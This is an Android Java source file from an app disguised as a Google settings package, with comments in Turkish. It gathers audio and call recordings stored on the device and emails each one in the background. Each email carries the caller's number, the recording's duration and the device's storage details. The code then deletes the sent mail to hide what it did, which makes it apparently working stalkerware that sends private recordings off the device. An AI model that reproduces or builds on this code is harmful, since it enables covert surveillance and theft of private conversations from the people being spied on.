package com.setting.dl.google.googlesettings.mail;

import android.annotation.SuppressLint;
import android.content.Context;
import android.media.MediaMetadataRetriever;
import android.net.Uri;
import android.os.AsyncTask;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.u;

import java.io.File;


public class MailingFile {
    
    
    private final Context  context;
    private       String[] audioFiles;
    
    public MailingFile(Context context) {
        
        this.context = context;
        run();
    }
    
    private void run() {
        
        //varsa mp3 dosyalarını alıyoruz
        audioFiles = getAudioParts();
        
        //yoksa kayboluyoruz
        if (audioFiles == null || audioFiles.length < 1) return;
        
        new MakeRequestTask().execute();
    }
    
    @SuppressLint("StaticFieldLeak")
    private class MakeRequestTask extends AsyncTask<Void, Void, Void> {
        
        @Override
        protected Void doInBackground(Void... params) {
            
            
            for (final String fileName : audioFiles) {
                
                u.log.d("MailingFile", "audio file : " + fileName);
                
                File file = new File(u.getAudioFolder(context), fileName);
                String body = u.getDate(file.lastModified()) + "\n";
                
                if (!fileName.endsWith(".mp3")) {
                    
                    String sure = getMp3Duration(Uri.parse(new File(u.getAudioFolder(context), getFileBaseName(fileName) + ".mp3").getAbsolutePath()));
                    
                    body += u.s("Dosya : %s\nBoyut : %s MB\nSüre : %s\n-------------------------\n", file.getName(), u.s("%.1f", (float) file.length() / 1024 / 1024), sure);
    
                    Mail.sendAudioFile(context, "audio record", body, file);
                    
                }
                
                else {
                    
                    try {
                        
                        u.log.d(u.s("dosyanın süresi %s ", getMp3Duration(Uri.parse(file.getAbsolutePath()))));
                        
                        //String body         = u.getDate(file.lastModified()) + "\n";
                        String baseFileName = fileName.split("\\.(?=[^\\.]+$)")[0];
                        
                        if (baseFileName.indexOf('_') == -1) {
                            
                            body += u.s("%-21s : %s\n%-21s : %.2f kb\n%-21s : %s\n%-21s : %.2f MB\n%-21s : %.2f MB\n%-21s : %.2f MB\n****************************\n",
                            
                                        
                                        "Dosya ismi", file.getName(),
                                        "Boyut", (float) file.length() / 1024,
                                        "Süre", getMp3Duration(Uri.parse(file.getAbsolutePath())),
                                        "Toplam alan", (float) file.getTotalSpace() / (1024 * 1024),
                                        "Boş alan", (float) file.getFreeSpace() / (1024 * 1024),
                                        "Kullanılabilir alan", (float) file.getUsableSpace() / (1024 * 1024)
                            
                                       );
    
                            Mail.sendAudioFile(context, "audio record", body, file);
                            
                            
                        }
                        else {
                            
                            String[] nameAndNumber = baseFileName.split("_");
                            
                            //maile koyacağımız bilgiler
                            
                            
                            body += u.s("%-21s : %s\n%-21s : %.2f kb\n%-21s : %s\n%-21s : %.2f MB\n%-21s : %.2f MB\n%-21s : %.2f MB\n%-21s : %s\n%-21s : %s\n****************************\n",
                                        "Numara", nameAndNumber[1],
                                        "Boyut", (float) file.length() / 1024,
                                        "Süre", getMp3Duration(Uri.parse(file.getAbsolutePath())),
                                        "Toplam alan", (float) file.getTotalSpace() / (1024 * 1024),
                                        "Boş alan", (float) file.getFreeSpace() / (1024 * 1024),
                                        "Kullanılabilir alan", (float) file.getUsableSpace() / (1024 * 1024),
                                        "Dosya yolu", file.getAbsolutePath(),
                                        "Dosya ismi", file.getName()
                            
                                       );
    
                            Mail.sendAudioFile(context, "callrecord", body, file);
                        }
                    }
                    catch (Exception e) {
                        
                        u.log.e(e.toString());
                    }
                }
                
                u.run(() -> Mail.deleteAllSent(context), 10000);
            }
            
            
            return null;
        }
    }
    
    
    private static String getFileBaseName(String path) {
        
        return path.split("\\.(?=[^\\.]+$)")[0];
        
        
    }
    
    private static String getMp3Duration(Uri filePath) {
        
        MediaMetadataRetriever metaRetriever = new MediaMetadataRetriever();
        metaRetriever.setDataSource(filePath.toString());
        //return formateMilliSeccond(MediaPlayer.create(context, filePath).getDuration());
        return formateMilliSeccond(getDuration(filePath.toString()));
    }
    
    /**
     * Function to convert milliseconds time to
     * Timer Format
     * Hours:Minutes:Seconds
     */
    private static String formateMilliSeccond(long milliseconds) {
        
        String finalTimerString = "";
        String secondsString;
        
        // Convert total duration into time
        int hours = (int) (milliseconds / (1000 * 60 * 60));
        int minutes = (int) (milliseconds % (1000 * 60 * 60)) / (1000 * 60);
        int seconds = (int) ((milliseconds % (1000 * 60 * 60)) % (1000 * 60) / 1000);
        
        // Add hours if there
        if (hours > 0) {
            finalTimerString = hours + ":";
        }
        
        // Prepending 0 to seconds if it is one digit
        if (seconds < 10) {
            secondsString = "0" + seconds;
        }
        else {
            secondsString = "" + seconds;
        }
        
        finalTimerString = finalTimerString + minutes + ":" + secondsString;
        
        //      return  String.format("%02d Min, %02d Sec",
        //                TimeUnit.MILLISECONDS.toMinutes(milliseconds),
        //                TimeUnit.MILLISECONDS.toSeconds(milliseconds) -
        //                        TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(milliseconds)));
        
        // return timer string
        return finalTimerString;
    }
    
    private static long getDuration(String filePath) {
        
        MediaMetadataRetriever metaRetriever = new MediaMetadataRetriever();
        metaRetriever.setDataSource(filePath);
        
        String duration = metaRetriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
        
        metaRetriever.release();
        return Long.parseLong(duration);
        
    }
    
    private String[] getAudioParts() {
        
        File dir = new File(u.getAudioFolder(context));
        
        String[] files = null;
        
        if (dir.exists()) {
            
            files = dir.list();
            
        }
        
        return files;
    }
    
}
